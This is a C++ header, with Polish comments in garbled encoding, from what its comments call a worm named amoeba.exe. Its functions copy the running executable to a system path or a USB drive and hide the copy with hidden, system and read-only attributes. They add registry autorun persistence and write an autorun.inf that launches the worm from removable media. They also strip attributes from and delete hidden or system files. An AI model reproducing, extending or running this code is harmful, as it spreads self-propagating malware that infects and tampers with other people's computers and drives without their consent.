#pragma once

#include "pch.h"
#include "register.h"

class File
{
public:
	/// Wy³¹cza atrybuty: ukryty, systemowy oraz tylko do odczytu
	static void TurnOffAttributes(LPCTSTR file)
	{
		DWORD attrib;
		// pobranie atrybutów
		if ((attrib = GetFileAttributes(file)) == INVALID_FILE_ATTRIBUTES)
			return;
		// usuwamy atrybut systemowy jesli jest ustawiony
		if (attrib & FILE_ATTRIBUTE_SYSTEM)
			SetFileAttributes(file,attrib & ~FILE_ATTRIBUTE_SYSTEM);
		// usuwamy atrybut ukryty jeœli jest ustawiony
		if (attrib & FILE_ATTRIBUTE_HIDDEN)
			SetFileAttributes(file,attrib & ~FILE_ATTRIBUTE_HIDDEN);
		// usuwamy atrybut READONLY jeœli jest ustawiony
		if (attrib & FILE_ATTRIBUTE_READONLY)
			SetFileAttributes(file,attrib & ~FILE_ATTRIBUTE_READONLY);
	}
	/// W³¹cza atrybuty: ukryty, systemowy oraz tylko do odczytu
	static void TurnOnAttributes(LPCTSTR file)
	{
		// pobranie atrybutów
		DWORD attrib = GetFileAttributes(file);
		attrib |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY;
		SetFileAttributes(file,attrib);		
	}
	static bool EvilAttributes(LPCTSTR file)
	{
		DWORD attrib = GetFileAttributes(file);
		if (attrib == INVALID_FILE_ATTRIBUTES) return false;

		// je¿eli ma ustawiony atrybuty ukryty i/lub systemowy to znaczy ¿e
		// coœ jest nie tak chyba ¿e jest folderem ;]
		if (((attrib & FILE_ATTRIBUTE_SYSTEM) || (attrib & FILE_ATTRIBUTE_HIDDEN)) && !(attrib & FILE_ATTRIBUTE_DIRECTORY))
			return true;

		return false;
	}
	/// Usuwa dany plik
	static bool DeleteEvilFile(LPCTSTR file)
	{
		if(!Exist(file)) return false;

		File::TurnOffAttributes(file);	

		if(!DeleteFile(file))
			return false;
		return true;
	}
	/// Sprawdza czy dany plik istnieje
	static bool Exist(LPCTSTR file)
	{
		HANDLE hFile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
									OPEN_EXISTING,0,NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			return false;
		CloseHandle(hFile);
		return true;
	}

	/// Rozmna¿anie robaka :P czyli kopiowanie :D
	static bool DivideCell(bool pendrive=false, TCHAR letter=TEXT('F'))
	{
		TCHAR exe[MAX_PATH];
		GetModuleFileName(GetModuleHandle(NULL),exe,MAX_PATH);
		if (!pendrive)
		{			
			if(CopyFile(exe,cpPath,TRUE))
			{
				TurnOnAttributes(cpPath);
				CRegister::AddAutoRun();
			}
		}
		else
		{
			TCHAR pendrive[14];
			wsprintf(pendrive,TEXT("%c:\\amoeba.exe"), letter);
			CopyFile(exe,pendrive,FALSE);
			TurnOnAttributes(pendrive);
		}
		return true;
	}
	static bool AddAutorunAs(LPTSTR filename)
	{
		if(!File::DeleteEvilFile(filename)) return false; // usuniêcie pliku autorun.inf je¿eli istnieje

		HANDLE hFile = CreateFile(filename, GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_FLAG_RANDOM_ACCESS, 0);
		if (hFile == INVALID_HANDLE_VALUE) return false;
		else
		{
			char buffer[] = "[AutoRun]\r\nshellexecute=amoeba.exe";
			DWORD saved;
			WriteFile(hFile,buffer,sizeof(buffer)-1,&saved,NULL);

			CloseHandle(hFile);

			File::TurnOnAttributes(filename);
		}

		return true;
	}
private:
	File() {} // nie mo¿na utworzyæ obiektu tej klasy :P
};